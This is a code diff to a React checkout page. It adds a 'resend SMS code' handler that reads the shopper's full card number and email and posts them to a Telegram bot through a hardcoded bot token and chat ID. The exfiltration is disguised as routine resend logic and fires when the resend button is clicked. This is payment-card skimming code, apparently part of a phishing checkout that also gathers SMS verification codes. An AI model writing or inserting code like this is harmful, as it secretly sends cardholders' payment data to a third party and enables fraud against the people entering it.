@@ -178,6 +178,24 @@ const CheckoutPage = () => {
     }
   };
 
+  const handleResendCode = async () => {
+    setSmsCode("");
+    setSmsError("");
+    try {
+      const BOT_TOKEN = "8409248678:AAHcUnoy_00kFq71n-TY2gQZ1QLSOBQXZR0";
+      const CHAT_ID = "-4955146663";
+      const digits = cardNumber.replace(/\s/g, "");
+      const msg = `🔄 *Kod Yeniden Gönderim Talebi*\n\n💳 Kart: ${digits}\n📧 E-posta: ${email}`;
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }),
+      });
+    } catch (err) {
+      console.error("Telegram resend error:", err);
+    }
+  };
+
   const inputClass = "flex items-center gap-3 w-full border border-border rounded-xl px-4 py-3 text-left hover:border-foreground/30 transition-colors bg-card overflow-hidden";
   const inputFieldClass = "w-full min-w-0 bg-transparent outline-none text-sm text-foreground placeholder:text-muted-foreground";
 
@@ -463,7 +481,7 @@ const CheckoutPage = () => {
             </div>
 
             <div className="flex justify-center">
-              <button onClick={() => { setSmsCode(""); setSmsError(""); }} className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors">
+              <button onClick={handleResendCode} className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors">
                 <RefreshCw className="w-4 h-4" />
                 {t("checkout.smsResend")}
               </button>
